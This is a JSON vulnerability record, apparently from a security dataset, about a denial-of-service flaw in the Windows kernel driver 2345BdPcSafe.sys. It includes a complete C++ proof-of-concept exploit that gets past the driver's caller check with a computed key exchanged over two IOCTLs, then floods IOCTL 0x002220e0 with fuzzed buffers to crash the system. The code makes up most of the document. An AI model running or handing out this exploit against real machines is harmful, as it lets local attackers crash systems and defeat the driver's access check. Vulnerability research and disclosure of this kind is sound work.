```
{
  "vulnerability_details": {
    "root_cause": "The vulnerability is caused by the driver `2345BdPcSafe.sys` not properly validating input values passed to it through IOCTL code `0x002220e0`. Specifically, the driver uses the provided input buffer without checking its length or content, leading to a denial-of-service.",
    "weaknesses": [
      "Insufficient input validation",
      "Use of unchecked input in kernel-mode driver"
    ],
    "impact": "The vulnerability allows a local attacker to cause a denial of service (BSOD) by sending a specially crafted I/O control request to the driver. This crashes the system.",
    "attack_vectors": "Local attack via a specially crafted I/O control request to the `2345BdPcSafe.sys` driver.",
	"required_capabilities": "The attacker needs to be able to execute code locally on the Windows system where the vulnerable driver is installed."
  },
  "poc_code": {
     "description": "The provided C++ code demonstrates a proof-of-concept (PoC) exploit that triggers the vulnerability by sending crafted input data of random length to IOCTL 0x002220e0. It first bypasses a check using other IOCTL calls, and then sends the malicious payload in a loop, leading to a BSOD due to the lack of input validation in the driver.",
    "code": "```cpp\n#include <windows.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\nstruct NETFW_IOCTL_ADD_PID\n{\n\tDWORD pid;\n\tchar seed[0x14];//4 + 14\n};//0x18\n\n#pragma pack(push)\n#pragma pack(1)\nstruct NETFW_IOCTL_SET_PID\n{\n\tBYTE set_state;//\n\tWORD buf_len;//1\n\tDWORD pid;//3\n\tchar buf[0x64];//7\n};//6B\n#pragma pack(pop)\n\nint __stdcall f_XOR__12A30(BYTE *a1, BYTE *a2)\n{\n\tBYTE *a1_; // eax\n\n\ta1_ = a1;\n\t*a1_ ^= *a2;\n\t*a2 ^= *a1;\n\t*a1_ ^= *a2;\n\treturn (int)a1_;\n}\n\nint __stdcall sub_12A80(char *a1, int len, char *a3)\n{\n\tint result;\n\tunsigned __int8 v4;\n\t__int16 i;\n\t__int16 j;\n\tunsigned __int8 k;\n\n\tfor (i = 0; i < 256; ++i)\n\t\ta3[i] = i;\n\ta3[256] = 0;\n\ta3[257] = 0;\n\tk = 0;\n\tv4 = 0;\n\tresult = 0;\n\tfor (j = 0; j < 256; ++j)\n\t{\n\t\tv4 += a3[j] + a1[k];\n\t\tf_XOR__12A30((BYTE*)&a3[j], (BYTE*)&a3[v4]);\n\t\tresult = (k + 1) / len;\n\t\tk = (k + 1) % len;\n\t}\n\treturn result;\n}\n\nchar *__stdcall sub_12B60(char *a1, signed int len, char *a3)\n{\n\tchar *v3; // esi\n\tunsigned int v4; // ebx\n\tunsigned __int8 result; // al\n\tint v6; // edi\n\tchar *v7; // ST18_4\n\tint v8; // [esp+14h] [ebp-8h]\n\tint v9; // [esp+18h] [ebp-4h]\n\tunsigned __int8 v10; // [esp+2Fh] [ebp+13h]\n\n\tv3 = a3;\n\tv4 = a3[256];\n\tresult = a3[257];\n\tv9 = 0;\n\tif (len > 0)\n\t{\n\t\tv6 = (unsigned __int8)v4;\n\t\tv8 = 0;\n\t\twhile (1)\n\t\t{\n\t\t\tv4 = (v6 + 1) & 0x800000FF;\n\t\t\tv6 = (unsigned __int8)v4;\n\t\t\tv10 = v3[(unsigned __int8)v4] + result;\n\t\t\tv7 = &v3[v10];\n\t\t\tf_XOR__12A30((BYTE*)&v3[(unsigned __int8)v4], (BYTE*)v7);\n\t\t\ta1[v8] ^= v3[(unsigned __int8)(v3[(unsigned __int8)v4] + *v7)];\n\t\t\tv8 = (signed __int16)++v9;\n\t\t\tif ((signed __int16)v9 >= len)\n\t\t\t\tbreak;\n\t\t\tresult = v10;\n\t\t}\n\t\tresult = v10;\n\t}\n\tv3[256] = v4;\n\tv3[257] = result;\n\treturn (char *)result;\n}\n\nvoid calc_seed(char* seed, char* dst)\n{\n\tchar Source1[26] = { 0 };\n\tchar a3[300] = { 0 };\n\n\tSource1[0] = 8;\n\tSource1[1] = 14;\n\tSource1[2] = 8;\n\tSource1[3] = 10;\n\tSource1[4] = 2;\n\tSource1[5] = 3;\n\tSource1[6] = 29;\n\tSource1[7] = 23;\n\tSource1[8] = 13;\n\tSource1[9] = 3;\n\tSource1[10] = 15;\n\tSource1[11] = 22;\n\tSource1[12] = 15;\n\tSource1[13] = 7;\n\tSource1[14] = 91;\n\tSource1[15] = 4;\n\tSource1[16] = 18;\n\tSource1[17] = 26;\n\tSource1[18] = 26;\n\tSource1[19] = 3;\n\tSource1[20] = 4;\n\tSource1[21] = 1;\n\tSource1[22] = 15;\n\tSource1[23] = 25;\n\tSource1[24] = 10;\n\tSource1[25] = 13;\n\n\tsub_12A80(seed, 0x14, a3);\n\tsub_12B60(Source1, 0x1A, a3);\n\tmemcpy(dst, Source1, 26);\n}\n\nBOOL BypassChk(HANDLE h)\n{\n\tDWORD BytesReturned = 0;\n\n\tDWORD ctlcode = 0x222090;\n\tNETFW_IOCTL_ADD_PID add_pid = { 0 };\n\tadd_pid.pid = GetCurrentProcessId();\n\n\tif (!DeviceIoControl(h, ctlcode, &add_pid, sizeof(NETFW_IOCTL_ADD_PID), &add_pid, sizeof(NETFW_IOCTL_ADD_PID), &BytesReturned, NULL)) {\n\t\tprintf(\"[-] DeviceIoControl %x error: %d\\n\", ctlcode, GetLastError());\n\t\treturn FALSE;\n\t}\n\n\tctlcode = 0x222094;\n\tNETFW_IOCTL_SET_PID set_pid = { 0 };\n\tset_pid.pid = GetCurrentProcessId();\n\tset_pid.set_state = 1;\n\n\tcalc_seed(add_pid.seed, set_pid.buf);\n\tset_pid.buf_len = 26;\n\n\tif (!DeviceIoControl(h, ctlcode, &set_pid, sizeof(NETFW_IOCTL_SET_PID), &set_pid, sizeof(NETFW_IOCTL_SET_PID), &BytesReturned, NULL)) {\n\t\tprintf(\"[-] DeviceIoControl %x error: %d\\n\", ctlcode, GetLastError());\n\t\treturn FALSE;\n\t}\n\n\treturn TRUE;\n}\n\nHANDLE OpenDevice(char* path)\n{\n\treturn CreateFileA(path,\n\t\tGENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,\n\t\tNULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n}\n\nCHAR asciiString10[0x10];\nCHAR asciiString100[0x100];\nCHAR asciiString1000[0x1000];\nWCHAR unicodeString10[0x10];\nWCHAR unicodeString100[0x100];\nWCHAR unicodeString1000[0x1000];\nDWORD tableDwords[0x100];\n\nDWORD FuzzConstants[] = {\n\t0x00000000, 0x00000001, 0x00000004, 0xFFFFFFFF,\n\t0x00001000, 0xFFFF0000, 0xFFFFFFFE, 0xFFFFFFF0,\n\t0xFFFFFFFC, 0x70000000, 0x7FFEFFFF, 0x7FFFFFFF,\n\t0x80000000,\n\t(DWORD)asciiString10,\n\t(DWORD)asciiString100,\n\t(DWORD)asciiString1000,\n\t(DWORD)unicodeString10,\n\t(DWORD)unicodeString100,\n\t(DWORD)unicodeString1000,\n\t(DWORD)tableDwords\n};\n\n/* Period parameters */\n#define N 624\n#define M 397\n#define MATRIX_A 0x9908b0dfUL   /* constant vector a */\n#define UPPER_MASK 0x80000000UL /* most significant w-r bits */\n#define LOWER_MASK 0x7fffffffUL /* least significant r bits */\n\nstatic unsigned long mt[N]; /* the array for the state vector  */\nstatic int mti = N + 1; /* mti==N+1 means mt[N] is not initialized */\n\n/* initializes mt[N] with a seed */\nvoid init_genrand(unsigned long s)\n{\n\tmt[0] = s & 0xffffffffUL;\n\tfor (mti = 1; mti < N; mti++) {\n\t\tmt[mti] =\n\t\t\t(1812433253UL * (mt[mti - 1] ^ (mt[mti - 1] >> 30)) + mti);\n\t\t/* See Knuth TAOCP Vol2. 3rd Ed. P.106 for multiplier. */\n\t\t/* In the previous versions, MSBs of the seed affect   */\n\t\t/* only MSBs of the array mt[].                        */\n\t\t/* 2002/01/09 modified by Makoto Matsumoto             */\n\t\tmt[mti] &= 0xffffffffUL;\n\t\t/* for >32 bit machines */\n\t}\n}\n\n/* generates a random number on [0,0xffffffff]-interval */\nunsigned long genrand_int32(void)\n{\n\tunsigned long y;\n\tstatic unsigned long mag01[2] = { 0x0UL, MATRIX_A };\n\t/* mag01[x] = x * MATRIX_A  for x=0,1 */\n\n\tif (mti >= N) { /* generate N words at one time */\n\t\tint kk;\n\n\t\tif (mti == N + 1)   /* if init_genrand() has not been called, */\n\t\t\tinit_genrand(5489UL); /* a default initial seed is used */\n\n\t\tfor (kk = 0; kk < N - M; kk++) {\n\t\t\ty = (mt[kk] & UPPER_MASK) | (mt[kk + 1] & LOWER_MASK);\n\t\t\tmt[kk] = mt[kk + M] ^ (y >> 1) ^ mag01[y & 0x1UL];\n\t\t}\n\t\tfor (; kk < N - 1; kk++) {\n\t\t\ty = (mt[kk] & UPPER_MASK) | (mt[kk + 1] & LOWER_MASK);\n\t\t\tmt[kk] = mt[kk + (M - N)] ^ (y >> 1) ^ mag01[y & 0x1UL];\n\t\t}\n\t\ty = (mt[N - 1] & UPPER_MASK) | (mt[0] & LOWER_MASK);\n\t\tmt[N - 1] = mt[M - 1] ^ (y >> 1) ^ mag01[y & 0x1UL];\n\n\t\tmti = 0;\n\t}\n\n\ty = mt[mti++];\n\n\t/* Tempering */\n\ty ^= (y >> 11);\n\ty ^= (y << 7) & 0x9d2c5680UL;\n\ty ^= (y << 15) & 0xefc60000UL;\n\ty ^= (y >> 18);\n\n\treturn y;\n}\n\nunsigned long getrand(unsigned long min, unsigned long max)\n{\n\treturn (genrand_int32() % (max - min + 1)) + min;\n}\n\n//3.7.0.2860\nint poc_2345NetFirewall()\n{\n\n\tDWORD BytesReturned = 0;\n\n\tHANDLE h = OpenDevice(\"\\\\\\\\.\\\\2345BdPcSafe\");\n\tif (h == INVALID_HANDLE_VALUE) {\n\t\tprintf(\"[-] Open device error: %d\\n\", GetLastError());\n\t\treturn 1;\n\t}\n\n\tif (!BypassChk(h)) {\n\t\tprintf(\"[-] error!\");\n\t\treturn 1;\n\t}\n\n\tDWORD ctlcode = 0x002220e0;\n\tBYTE  bufInput[0x10000] = { 0 };\n\tBYTE  bufOutput[0x10000] = { 0 };\n\n\tsrand(time(NULL));\n\tint count = 0;\n\twhile (count++ < 1000) {\n\t\t// Choose a random length for the buffer\n\t\tsize_t randomLength = getrand(4, 0x400);\n\n\t\tfor (int i = 0; i < randomLength; i = i + 4) {\n\t\t\tint fuzzData = FuzzConstants[getrand(0, (sizeof(FuzzConstants) / 4) - 1)];\n\n\t\t\t// Choose a random element into FuzzConstants\n\t\t\tbufInput[i] = fuzzData & 0x000000ff;\n\t\t\tbufInput[i + 1] = (fuzzData & 0x0000ff00) >> 8;\n\t\t\tbufInput[i + 2] = (fuzzData & 0x00ff0000) >> 16;\n\t\t\tbufInput[i + 3] = (fuzzData & 0xff000000) >> 24;\n\t\t}\n\n\t\tDeviceIoControl(h,\n\t\t\tctlcode,\n\t\t\tbufInput,\n\t\t\trandomLength,\n\t\t\tbufOutput,\n\t\t\t0,\n\t\t\t&BytesReturned,\n\t\t\tNULL);\n\n\t\tSleep(10);\n\t}\n\n\treturn 0;\n}\n\nint main()\n{\n\tpoc_2345NetFirewall();\n\n\tprintf(\"poc failed!\\n\");\n\n\tgetchar();\n\n\treturn 0;\n}\n```"
   }
}
```